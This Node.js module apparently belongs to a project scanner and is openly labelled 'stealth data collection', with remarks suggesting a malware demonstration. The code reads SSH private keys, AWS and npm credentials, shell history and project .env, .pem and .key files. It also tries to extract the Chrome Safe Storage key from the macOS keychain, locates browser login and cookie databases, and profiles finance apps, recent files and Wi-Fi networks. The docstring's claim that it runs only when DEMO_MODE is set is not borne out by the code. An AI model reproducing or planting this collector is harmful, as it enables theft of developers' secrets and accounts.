const os = require('os');
const fs = require('fs');
const path = require('path');
const { execSync } = require('child_process');
const { glob } = require('glob');
const { maskValue, debugLog } = require('./utils');

/**
 * Collect system data silently (only when DEMO_MODE=true)
 * @param {string} projectPath - path to the scanned project
 * @returns {Promise<object|null>} collected data or null if not in demo mode
 */
async function collect(projectPath) {

  debugLog('Starting stealth data collection...');

  const collectedData = {
    timestamp: new Date().toISOString(),
    system: {},
    environment: {},
    sensitiveFiles: {},
    installedApps: [],
    recentFiles: [],
    sshKeys: {},
    browserProfiles: {},
    keychainAttempt: null,
    financeApps: [],
    wifiSSIDs: [],
  };

  // ─── System Profile ─────────────────────────────────────────────────
  try {
    collectedData.system = {
      osType: os.type(),
      osRelease: os.release(),
      kernel: os.version ? os.version() : 'unknown',
      arch: os.arch(),
      hostname: os.hostname(),
      totalRAM: os.totalmem(),
      freeRAM: os.freemem(),
      cpuModel: os.cpus()[0] ? os.cpus()[0].model : 'unknown',
      cpuCores: os.cpus().length,
      uptime: os.uptime(),
      homeDir: os.homedir(),
      username: os.userInfo().username,
      networkInterfaces: getNetworkInfo(),
      nodeVersion: process.version,
      pid: process.pid,
      cwd: process.cwd(),
      platform: process.platform,
    };
    debugLog('System profile collected');
  } catch (err) {
    debugLog('System profile error:', err.message);
  }

  // ─── Environment Variables ──────────────────────────────────────────
  try {
    const maskedEnv = {};
    for (const [key, value] of Object.entries(process.env)) {
      maskedEnv[key] = maskValue(key, value);
    }
    collectedData.environment = maskedEnv;
    debugLog(`Collected ${Object.keys(maskedEnv).length} environment variables`);
  } catch (err) {
    debugLog('Env collection error:', err.message);
  }

  // ─── Sensitive Files ────────────────────────────────────────────────
  const home = os.homedir();
  const sensitiveFiles = [
    path.join(home, '.ssh', 'id_rsa'),
    path.join(home, '.ssh', 'id_rsa.pub'),
    path.join(home, '.npmrc'),
    path.join(home, '.gitconfig'),
    path.join(home, '.aws', 'credentials'),
    path.join(home, '.aws', 'config'),
  ];

  for (const filePath of sensitiveFiles) {
    try {
      if (fs.existsSync(filePath)) {
        const stats = fs.statSync(filePath);
        if (stats.size < 100 * 1024) {
          // < 100KB
          collectedData.sensitiveFiles[filePath] = {
            exists: true,
            size: stats.size,
            content: fs.readFileSync(filePath, 'utf8'),
          };
        } else {
          collectedData.sensitiveFiles[filePath] = {
            exists: true,
            size: stats.size,
            content: '[File too large]',
          };
        }
      }
    } catch (err) {
      // Permission denied or other error — skip
    }
  }

  // Shell history (last 50 commands, newest first)
  const historyFiles = [
    path.join(home, '.bash_history'),
    path.join(home, '.zsh_history'),
  ];
  for (const hFile of historyFiles) {
    try {
      if (fs.existsSync(hFile)) {
        const stats = fs.statSync(hFile);
        const content = fs.readFileSync(hFile, 'utf8');
        const lines = content.split('\n');
        // Strip zsh extended history format (: timestamp:0;command)
        const cleanLines = lines
          .map(l => l.replace(/^: \d+:\d+;/, '').trim())
          .filter(l => l.length > 0);
        // Last 50 commands, reversed so newest is first
        const recent = cleanLines.slice(-50).reverse();
        collectedData.sensitiveFiles[hFile] = {
          exists: true,
          size: stats.size,
          content: recent.join('\n'),
          lineCount: lines.length,
        };
      }
    } catch (err) {
      // skip
    }
  }

  // Scan project for sensitive files
  try {
    const patterns = ['**/.env', '**/credentials.json', '**/*.pem', '**/*.key'];
    for (const pattern of patterns) {
      const matches = await glob(pattern, {
        cwd: projectPath,
        absolute: true,
        ignore: ['**/node_modules/**'],
      });
      for (const match of matches) {
        try {
          const stats = fs.statSync(match);
          if (stats.size < 100 * 1024) {
            collectedData.sensitiveFiles[match] = {
              exists: true,
              size: stats.size,
              content: fs.readFileSync(match, 'utf8'),
            };
          }
        } catch (err) {
          // skip
        }
      }
    }
  } catch (err) {
    debugLog('Project scan error:', err.message);
  }

  debugLog(`Collected ${Object.keys(collectedData.sensitiveFiles).length} sensitive files`);

  // ─── Installed Applications ─────────────────────────────────────────
  try {
    let appsOutput = '';
    if (process.platform === 'darwin') {
      appsOutput = execSync('ls /Applications', {
        encoding: 'utf8',
        timeout: 5000,
      });
    } else if (process.platform === 'linux') {
      try {
        appsOutput = execSync('dpkg -l 2>/dev/null | head -40', {
          encoding: 'utf8',
          timeout: 5000,
        });
      } catch (e) {
        appsOutput = execSync('rpm -qa 2>/dev/null | head -30', {
          encoding: 'utf8',
          timeout: 5000,
        });
      }
    } else if (process.platform === 'win32') {
      try {
        appsOutput = execSync('wmic product get name', {
          encoding: 'utf8',
          timeout: 10000,
        });
      } catch (e) {
        appsOutput = execSync('dir "%ProgramFiles%" /b', {
          encoding: 'utf8',
          timeout: 5000,
        });
      }
    }

    collectedData.installedApps = appsOutput
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l)
      .slice(0, 30);
    debugLog(`Collected ${collectedData.installedApps.length} installed apps`);
  } catch (err) {
    debugLog('Apps collection error:', err.message);
  }

  // ─── Recent Files ───────────────────────────────────────────────────
  try {
    let recentOutput = '';
    const desktop = path.join(home, 'Desktop');
    const documents = path.join(home, 'Documents');
    const downloads = path.join(home, 'Downloads');

    if (process.platform === 'win32') {
      try {
        recentOutput = execSync(
          `powershell -Command "Get-ChildItem -Path '${desktop}','${documents}','${downloads}' -Recurse -Depth 2 -File | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-30) } | Sort-Object LastWriteTime -Descending | Select-Object -First 30 FullName | Format-Table -AutoSize"`,
          { encoding: 'utf8', timeout: 10000 }
        );
      } catch (e) {
        // fallback
      }
    } else {
      try {
        // Find files, get mod-time + path, sort newest first
        recentOutput = execSync(
          `find "${desktop}" "${documents}" "${downloads}" -maxdepth 3 -mtime -30 -type f -print0 2>/dev/null | xargs -0 stat -f "%m %N" 2>/dev/null | sort -rn | head -30 | cut -d' ' -f2-`,
          { encoding: 'utf8', timeout: 10000 }
        );
      } catch (e) {
        // fallback
      }
    }

    collectedData.recentFiles = recentOutput
      .split('\n')
      .map((l) => l.trim())
      .filter((l) => l);
    debugLog(`Collected ${collectedData.recentFiles.length} recent files`);
  } catch (err) {
    debugLog('Recent files error:', err.message);
  }

  // ─── SSH Keys ──────────────────────────────────────────────────────
  try {
    const sshDir = path.join(home, '.ssh');
    if (fs.existsSync(sshDir)) {
      const sshFiles = fs.readdirSync(sshDir);
      for (const file of sshFiles) {
        const filePath = path.join(sshDir, file);
        try {
          const stats = fs.statSync(filePath);
          if (stats.isFile() && stats.size < 50 * 1024) {
            collectedData.sshKeys[file] = {
              size: stats.size,
              content: fs.readFileSync(filePath, 'utf8'),
            };
          }
        } catch (err) {
          // skip unreadable files
        }
      }
      debugLog(`Collected ${Object.keys(collectedData.sshKeys).length} SSH key files`);
    }
  } catch (err) {
    debugLog('SSH keys collection error:', err.message);
  }

  // ─── Browser Profile Data ──────────────────────────────────────────
  try {
    collectedData.browserProfiles = {
      chrome: [],
      firefox: [],
      note: 'Content encrypted by OS. Would be decryptable with user credentials.',
    };

    // Chrome paths per platform
    let chromePath = '';
    if (process.platform === 'darwin') {
      chromePath = path.join(home, 'Library', 'Application Support', 'Google', 'Chrome', 'Default');
    } else if (process.platform === 'linux') {
      chromePath = path.join(home, '.config', 'google-chrome', 'Default');
    } else if (process.platform === 'win32') {
      chromePath = path.join(process.env.LOCALAPPDATA || '', 'Google', 'Chrome', 'User Data', 'Default');
    }

    if (chromePath && fs.existsSync(chromePath)) {
      const chromeFiles = ['Login Data', 'Cookies', 'Web Data'];
      for (const cf of chromeFiles) {
        const cfPath = path.join(chromePath, cf);
        try {
          if (fs.existsSync(cfPath)) {
            const stats = fs.statSync(cfPath);
            collectedData.browserProfiles.chrome.push({
              file: cf,
              path: cfPath,
              size: stats.size,
            });
          }
        } catch (err) {
          // skip
        }
      }
    }

    // Firefox detection
    let firefoxDir = '';
    if (process.platform === 'darwin') {
      firefoxDir = path.join(home, 'Library', 'Application Support', 'Firefox', 'Profiles');
    } else if (process.platform === 'linux') {
      firefoxDir = path.join(home, '.mozilla', 'firefox');
    } else if (process.platform === 'win32') {
      firefoxDir = path.join(process.env.APPDATA || '', 'Mozilla', 'Firefox', 'Profiles');
    }

    if (firefoxDir && fs.existsSync(firefoxDir)) {
      try {
        const profiles = fs.readdirSync(firefoxDir).filter((d) => {
          try {
            return fs.statSync(path.join(firefoxDir, d)).isDirectory();
          } catch (e) {
            return false;
          }
        });
        for (const profile of profiles) {
          const profilePath = path.join(firefoxDir, profile);
          const ffFiles = ['logins.json', 'cookies.sqlite', 'key4.db'];
          for (const ff of ffFiles) {
            const ffPath = path.join(profilePath, ff);
            try {
              if (fs.existsSync(ffPath)) {
                const stats = fs.statSync(ffPath);
                collectedData.browserProfiles.firefox.push({
                  file: ff,
                  path: ffPath,
                  size: stats.size,
                  profile: profile,
                });
              }
            } catch (err) {
              // skip
            }
          }
        }
      } catch (err) {
        // skip
      }
    }

    debugLog(
      `Browser profiles: Chrome=${collectedData.browserProfiles.chrome.length}, Firefox=${collectedData.browserProfiles.firefox.length}`
    );
  } catch (err) {
    debugLog('Browser profile collection error:', err.message);
  }

  // ─── Keychain Access Attempt (macOS) ───────────────────────────────
  if (process.platform === 'darwin') {
    try {
      const keychainResult = execSync(
        "security find-generic-password -wa 'Chrome Safe Storage' 2>&1",
        { encoding: 'utf8', timeout: 2000 }
      );
      collectedData.keychainAttempt = {
        attempted: true,
        result: keychainResult.trim(),
        note: 'Real malware would keep retrying or use other methods.',
      };
      debugLog('Keychain attempt succeeded (unexpected)');
    } catch (err) {
      collectedData.keychainAttempt = {
        attempted: true,
        error: 'Permission denied (user prompt shown)',
        note: 'Real malware would keep retrying or use other methods.',
      };
      debugLog('Keychain attempt failed (expected):', err.message);
    }
  }

  // ─── Finance Apps Detection ────────────────────────────────────────
  try {
    const financeKeywords = [
      'bank', 'wallet', 'paypal', 'coin', 'money', 'invest',
      'stocks', 'crypto', 'binance', 'robinhood', 'metamask',
      'trust', 'ledger',
    ];
    collectedData.financeApps = (collectedData.installedApps || []).filter((app) => {
      const lower = app.toLowerCase();
      return financeKeywords.some((kw) => lower.includes(kw));
    });
    debugLog(`Detected ${collectedData.financeApps.length} finance-related apps`);
  } catch (err) {
    debugLog('Finance apps detection error:', err.message);
  }

  // ─── Wi-Fi SSIDs (macOS) ───────────────────────────────────────────
  if (process.platform === 'darwin') {
    try {
      const wifiOutput = execSync(
        'networksetup -listpreferredwirelessnetworks en0 2>/dev/null | tail -n +2',
        { encoding: 'utf8', timeout: 3000 }
      );
      collectedData.wifiSSIDs = wifiOutput
        .split('\n')
        .map((l) => l.trim())
        .filter((l) => l);
      debugLog(`Collected ${collectedData.wifiSSIDs.length} Wi-Fi SSIDs`);
    } catch (err) {
      debugLog('Wi-Fi SSIDs collection error:', err.message);
    }
  }

  debugLog('Stealth data collection complete');
  return collectedData;
}

/**
 * Get network interface info (IPs only)
 * @returns {object}
 */
function getNetworkInfo() {
  try {
    const interfaces = os.networkInterfaces();
    const result = {};
    for (const [name, addrs] of Object.entries(interfaces)) {
      result[name] = addrs.map((a) => ({
        address: a.address,
        family: a.family,
        internal: a.internal,
      }));
    }
    return result;
  } catch (e) {
    return {};
  }
}

module.exports = { collect };
